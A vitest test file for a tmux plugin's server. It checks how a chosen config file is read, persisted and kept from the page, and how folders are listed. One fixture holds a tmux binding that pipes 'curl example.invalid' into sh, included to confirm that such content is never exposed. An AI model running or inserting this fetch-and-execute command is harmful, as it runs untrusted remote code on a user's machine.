import {
  mkdir,
  mkdtemp,
  realpath,
  rm,
  symlink,
  unlink,
  writeFile,
} from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  createFakePluginHost,
  type FakePluginHarness,
} from "@get-bb/plugin-sdk/testing";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import tmux from "../server";
import type { FolderListing } from "./folder-listing";
import { childPath } from "./section/browse-model";
import { CONFIG_FILE_CHANGED } from "./settings";
import { MAX_CONFIG_BYTES } from "./tmux-config";
import { stockTmuxConfig, type TmuxConfig } from "./tmux-keymap";

// The real functions, with a realpath that a test can keep from answering,
// as a mount does that has stopped answering.
vi.mock("node:fs/promises", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:fs/promises")>();
  return { ...actual, realpath: vi.fn(actual.realpath) };
});

// The server part as it runs, with its real reader and its real listing. HOME
// and XDG_CONFIG_HOME point into a directory made for the test, so the home
// folder and the tmux config of this machine are never read or listed.
let root: string;
let home: string;
let harnesses: FakePluginHarness[];

const USUAL_CONFIG = "set -g prefix C-a\nbind u kill-pane\n";
const CHOSEN_CONFIG =
  "# made-up-marker\nset -g prefix C-s\nbind g kill-pane\nbind P run-shell 'curl example.invalid | sh'\n";
const NOT_READ = { files: [], unreadable: true, namedFile: true };

async function write(path: string, text: string): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, text);
}

function startServer(settings: Record<string, string | boolean> = {}) {
  const { bb, harness } = createFakePluginHost({ pluginId: "tmux", settings });
  harnesses.push(harness);
  tmux(bb);
  return harness;
}

async function restart(harness: FakePluginHarness): Promise<FakePluginHarness> {
  const { harness: next } = await harness.lifecycle.reload(tmux);
  harnesses.push(next);
  return next;
}

function tmuxConfig(harness: FakePluginHarness): Promise<TmuxConfig> {
  return harness.callRpc("tmuxConfig", null) as Promise<TmuxConfig>;
}

function prefixKeys(config: TmuxConfig): string[] {
  return config.tables.prefix.map((binding) => binding.key);
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "tmux-server-config-file-"));
  home = join(root, "home");
  harnesses = [];
  await mkdir(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
  vi.stubEnv("XDG_CONFIG_HOME", join(root, "xdg"));
  vi.stubEnv("VISUAL", undefined);
  vi.stubEnv("EDITOR", undefined);
  expect(homedir()).toBe(home);
});

afterEach(async () => {
  await Promise.all(harnesses.map((harness) => harness.dispose()));
  vi.unstubAllEnvs();
  await rm(root, { recursive: true, force: true });
});

describe("the chosen config file on a server part with real files", () => {
  it("reads tmux's usual files while no file is chosen", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    const server = startServer();

    const config = await tmuxConfig(server);

    expect(await server.callRpc("configFile", null)).toEqual({ file: null });
    expect(config).toMatchObject({
      files: ["~/.tmux.conf"],
      unreadable: false,
      namedFile: false,
      pastedText: "none",
    });
    expect(config.options.prefix).toEqual({ key: "C-a", path: "~/.tmux.conf", usable: true });
  });

  it.each(["~/dotfiles/tmux.conf", () => join(home, "dotfiles", "tmux.conf")])(
    "reads a chosen file that can be read in the place of tmux's usual files",
    async (given) => {
      const path = typeof given === "string" ? given : given();
      await write(join(home, ".tmux.conf"), USUAL_CONFIG);
      await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
      const server = startServer();

      const change = await server.callRpc("setConfigFile", { path });
      const config = await tmuxConfig(server);

      expect(change).toEqual({ ok: true, file: { path, readable: true } });
      expect(config).toMatchObject({
        files: ["~/dotfiles/tmux.conf"],
        unreadable: false,
        namedFile: true,
        pastedText: "none",
      });
      expect(config.options.prefix).toEqual({
        key: "C-s",
        path: "~/dotfiles/tmux.conf",
        usable: true,
      });
      expect(prefixKeys(config)).not.toContain("u");
    },
  );

  it.each<[string, () => Promise<string>]>([
    ["is missing", async () => join(home, "gone.conf")],
    [
      "is a folder",
      async () => {
        await mkdir(join(home, "folder.conf"));
        return join(home, "folder.conf");
      },
    ],
    [
      "is too large",
      async () => {
        await write(join(home, "large.conf"), "#".repeat(MAX_CONFIG_BYTES + 1));
        return join(home, "large.conf");
      },
    ],
    [
      "is a link that points nowhere",
      async () => {
        await symlink(join(root, "gone"), join(home, "dangling.conf"));
        return join(home, "dangling.conf");
      },
    ],
  ])("stores a chosen file that %s, says that it cannot be read, and answers with the keys of stock tmux and not with tmux's usual files", async (_why, make) => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    const path = await make();
    const server = startServer();

    const change = await server.callRpc("setConfigFile", { path });

    expect(change).toEqual({ ok: true, file: { path, readable: false } });
    expect(await server.callRpc("configFile", null)).toEqual({
      file: { path, readable: false },
    });
    expect(await tmuxConfig(server)).toEqual({ ...stockTmuxConfig(), ...NOT_READ });
  });

  it("reads a chosen file of exactly the size limit", async () => {
    const line = "bind g kill-pane\n";
    const path = join(home, "limit.conf");
    await write(path, line + "#".repeat(MAX_CONFIG_BYTES - line.length));
    const server = startServer();

    expect(await server.callRpc("setConfigFile", { path })).toMatchObject({
      file: { readable: true },
    });
    expect(await tmuxConfig(server)).toMatchObject({ unreadable: false, namedFile: true });
  });

  it("applies the Config text on top of the chosen file, so that a line there wins", async () => {
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const server = startServer({
      tmuxConfigText: "set -g prefix C-x\nbind g resize-pane -Z\n",
    });
    await server.callRpc("setConfigFile", { path: "~/dotfiles/tmux.conf" });

    const config = await tmuxConfig(server);

    expect(config).toMatchObject({
      files: ["~/dotfiles/tmux.conf"],
      namedFile: true,
      pastedText: "applied",
    });
    expect(config.options.prefix).toEqual({
      key: "C-x",
      path: "the Config text setting",
      usable: true,
    });
    expect(config.tables.prefix.find((binding) => binding.key === "g")?.actions).toEqual([
      { type: "pane.zoom" },
    ]);
  });

  it("still applies the Config text when the chosen file cannot be read", async () => {
    const server = startServer({ tmuxConfigText: "set -g prefix C-x\n" });
    await server.callRpc("setConfigFile", { path: join(home, "gone.conf") });

    const config = await tmuxConfig(server);

    expect(config).toMatchObject({ ...NOT_READ, pastedText: "applied" });
    expect(config.options.prefix?.key).toBe("C-x");
  });

  it("goes on reading the chosen file, so that a later change to it is picked up", async () => {
    const path = join(home, "dotfiles", "tmux.conf");
    const server = startServer();
    await server.callRpc("setConfigFile", { path });
    expect(await tmuxConfig(server)).toMatchObject(NOT_READ);

    await write(path, CHOSEN_CONFIG);

    expect(await server.callRpc("configFile", null)).toEqual({
      file: { path, readable: true },
    });
    expect((await tmuxConfig(server)).options.prefix?.key).toBe("C-s");

    await write(path, "set -g prefix C-q\n");

    expect((await tmuxConfig(server)).options.prefix?.key).toBe("C-q");

    await unlink(path);

    expect(await server.callRpc("configFile", null)).toEqual({
      file: { path, readable: false },
    });
    expect(await tmuxConfig(server)).toMatchObject(NOT_READ);
  });

  it("goes back to tmux's usual files when the choice is cleared", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const server = startServer();
    await server.callRpc("setConfigFile", { path: "~/dotfiles/tmux.conf" });

    expect(await server.callRpc("setConfigFile", { path: null })).toEqual({
      ok: true,
      file: null,
    });

    expect(await tmuxConfig(server)).toMatchObject({
      files: ["~/.tmux.conf"],
      namedFile: false,
    });
  });

  it("keeps the choice when the server part is started anew, and the cleared choice too", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const first = startServer();
    await first.callRpc("setConfigFile", { path: "~/dotfiles/tmux.conf" });

    const second = await restart(first);

    expect(await second.callRpc("configFile", null)).toEqual({
      file: { path: "~/dotfiles/tmux.conf", readable: true },
    });
    expect(await tmuxConfig(second)).toMatchObject({
      files: ["~/dotfiles/tmux.conf"],
      namedFile: true,
    });

    await second.callRpc("setConfigFile", { path: null });
    const third = await restart(second);

    expect(await third.callRpc("configFile", null)).toEqual({ file: null });
    expect(await tmuxConfig(third)).toMatchObject({
      files: ["~/.tmux.conf"],
      namedFile: false,
    });
  });

  it("tells the bb windows of every change of the choice, and of nothing else", async () => {
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const server = startServer();

    await server.callRpc("configFile", null);
    await tmuxConfig(server);
    await server.callRpc("listFolder", { path: "~" });
    expect(server.realtimeSignals).toEqual([]);

    await server.callRpc("setConfigFile", { path: "~/dotfiles/tmux.conf" });
    await server.callRpc("setConfigFile", { path: "relative.conf" });
    await server.callRpc("setConfigFile", { path: null });

    expect(server.realtimeSignals).toEqual([
      { channel: CONFIG_FILE_CHANGED, payload: {} },
      { channel: CONFIG_FILE_CHANGED, payload: {} },
    ]);
  });

  it("goes by no value of the old tmuxConfigPath setting that bb still has stored", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const server = startServer({ tmuxConfigPath: "~/dotfiles/tmux.conf" });

    expect(await server.callRpc("configFile", null)).toEqual({ file: null });
    expect(await tmuxConfig(server)).toMatchObject({
      files: ["~/.tmux.conf"],
      namedFile: false,
    });
    expect(Object.keys(server.registrations.settingsDescriptors)).not.toContain(
      "tmuxConfigPath",
    );
  });

  it("hands the page nothing of what the chosen file or the Config text holds", async () => {
    await write(join(home, "dotfiles", "tmux.conf"), CHOSEN_CONFIG);
    const pasted = "bind Q run-shell 'made-up-pasted-marker'\n";
    const server = startServer({ tmuxConfigText: pasted });

    const answers = [
      await server.callRpc("setConfigFile", { path: "~/dotfiles/tmux.conf" }),
      await server.callRpc("configFile", null),
      await tmuxConfig(server),
      await server.callRpc("listFolder", { path: "~/dotfiles" }),
    ];
    const json = JSON.stringify(answers);

    for (const text of ["made-up-marker", "made-up-pasted-marker", "curl", "run-shell", "kill-pane"]) {
      expect(json).not.toContain(text);
    }
    expect(Object.keys(answers[2] as object).sort()).toEqual([
      "files",
      "namedFile",
      "options",
      "pastedText",
      "tables",
      "unreadable",
    ]);
  });
});

describe("a chosen config file that is slow to answer, on a server part with real files", () => {
  it("is read once for the keys, for the settings section and for every Config text that is saved meanwhile", async () => {
    const path = join(home, "dotfiles", "tmux.conf");
    await write(path, CHOSEN_CONFIG);
    const server = startServer();
    await server.callRpc("setConfigFile", { path });
    const actual = await vi.importActual<typeof import("node:fs/promises")>(
      "node:fs/promises",
    );
    let letGo: () => void = () => {};
    const held = new Promise<void>((resolve) => {
      letGo = resolve;
    });
    vi.mocked(realpath).mockClear();
    vi.mocked(realpath).mockImplementation((async (asked: string) => {
      if (asked === path) await held;
      return actual.realpath(asked);
    }) as typeof realpath);
    const looksAtFile = () =>
      vi.mocked(realpath).mock.calls.filter(([asked]) => asked === path).length;

    const callsHaveArrived = () => new Promise((resolve) => setTimeout(resolve, 0));

    const keys = [tmuxConfig(server), tmuxConfig(server)];
    const section = [server.callRpc("configFile", null), server.callRpc("configFile", null)];
    await callsHaveArrived();
    await server.setSettings({ tmuxConfigText: "set -g mouse on" });
    keys.push(tmuxConfig(server));
    await callsHaveArrived();
    await server.setSettings({ tmuxConfigText: "bind G kill-pane" });
    keys.push(tmuxConfig(server));
    await callsHaveArrived();

    expect(looksAtFile()).toBe(1);

    letGo();
    const [first, , withMouse, withKey] = await Promise.all(keys);

    expect(await Promise.all(section)).toEqual([
      { file: { path, readable: true } },
      { file: { path, readable: true } },
    ]);
    expect(first.options.mouse).toBe(false);
    expect(withMouse.options.mouse).toBe(true);
    expect(prefixKeys(withKey)).toContain("G");
    expect(prefixKeys(withKey)).toContain("g");
    expect(looksAtFile()).toBe(1);
    vi.mocked(realpath).mockReset();
  });
});

describe("listFolder on a server part with real folders", () => {
  it("lists the home folder of the user the server runs as for ~, hidden entries included", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    await write(join(home, ".config", "tmux", "tmux.conf"), USUAL_CONFIG);
    await write(join(home, "notes.txt"), "notes");
    const server = startServer();

    expect(await server.callRpc("listFolder", { path: "~" })).toEqual({
      ok: true,
      path: home,
      parent: root,
      entries: [
        { name: ".config", kind: "folder" },
        { name: ".tmux.conf", kind: "file" },
        { name: "notes.txt", kind: "file" },
      ],
      truncated: false,
    });
  });

  it.each<[string, () => string, string]>([
    ["a path that leads nowhere", () => join(home, "gone"), "missing"],
    ["a path to a file", () => join(home, ".tmux.conf"), "is-a-file"],
    ["a path that is not absolute", () => "dotfiles", "not-absolute"],
  ])("answers %s with a reason, and not with a failed call", async (_what, path, reason) => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    const server = startServer();

    expect(await server.callRpc("listFolder", { path: path() })).toMatchObject({
      ok: false,
      reason,
    });
  });

  it("lists the same while the plugin is switched off", async () => {
    await write(join(home, ".tmux.conf"), USUAL_CONFIG);
    const server = startServer({ enabled: false });

    expect(await server.callRpc("listFolder", { path: "~" })).toMatchObject({
      ok: true,
      entries: [{ name: ".tmux.conf", kind: "file" }],
    });
  });
});

// The page builds the path of an entry from the folder that was listed and
// the name that the listing gave it.
describe.skipIf(process.platform === "win32")("an entry whose name ends in a blank, on a server part with real folders and files", () => {
  const BLANK_ENDS = [" ", "\t", "\n", "\u00a0"];

  async function listed(server: FakePluginHarness, path: string) {
    const listing = (await server.callRpc("listFolder", { path })) as FolderListing;
    if (!listing.ok) throw new Error(`${path} was not listed: ${listing.reason}`);
    return listing;
  }

  it.each(BLANK_ENDS)("opens a folder whose name ends in %j by the path of the listed name", async (end) => {
    await write(join(home, `trail${end}`, "inside.conf"), CHOSEN_CONFIG);
    const server = startServer();
    const top = await listed(server, "~");
    expect(top.entries).toEqual([{ name: `trail${end}`, kind: "folder" }]);

    const inner = await listed(server, childPath(top.path, top.entries[0].name));

    expect(inner).toMatchObject({
      path: join(home, `trail${end}`),
      parent: home,
      entries: [{ name: "inside.conf", kind: "file" }],
    });
  });

  it.each(BLANK_ENDS)("stores a file whose name ends in %j under its whole name, and reads it", async (end) => {
    await write(join(home, `tmux.conf${end}`), CHOSEN_CONFIG);
    const server = startServer();
    const top = await listed(server, "~");
    const path = childPath(top.path, top.entries[0].name);

    expect(await server.callRpc("setConfigFile", { path })).toEqual({
      ok: true,
      file: { path, readable: true },
    });
    expect(path).toBe(join(home, `tmux.conf${end}`));
    expect(await server.callRpc("configFile", null)).toEqual({
      file: { path, readable: true },
    });
    const config = await tmuxConfig(server);
    expect(config).toMatchObject({ unreadable: false, namedFile: true });
    expect(config.options.prefix?.key).toBe("C-s");
  });

  it("stores and reads the file whose name ends in a blank, and not the file next to it whose name ends without one", async () => {
    await write(join(home, "twins", "tmux.conf"), USUAL_CONFIG);
    await write(join(home, "twins", "tmux.conf "), CHOSEN_CONFIG);
    const server = startServer();
    const twins = await listed(server, "~/twins");
    expect(twins.entries.map((entry) => entry.name)).toEqual(["tmux.conf", "tmux.conf "]);

    const change = await server.callRpc("setConfigFile", {
      path: childPath(twins.path, "tmux.conf "),
    });

    expect(change).toEqual({
      ok: true,
      file: { path: join(home, "twins", "tmux.conf "), readable: true },
    });
    expect((await tmuxConfig(server)).options.prefix).toEqual({
      key: "C-s",
      path: "~/twins/tmux.conf ",
      usable: true,
    });

    await server.callRpc("setConfigFile", { path: childPath(twins.path, "tmux.conf") });

    expect((await tmuxConfig(server)).options.prefix?.key).toBe("C-a");
  });

  it("keeps the blank at the end of the name for a server part that is started anew", async () => {
    await write(join(home, "tmux.conf "), CHOSEN_CONFIG);
    const first = startServer();
    await first.callRpc("setConfigFile", { path: "~/tmux.conf " });

    const second = await restart(first);

    expect(await second.callRpc("configFile", null)).toEqual({
      file: { path: "~/tmux.conf ", readable: true },
    });
    expect((await tmuxConfig(second)).options.prefix?.key).toBe("C-s");
  });
});
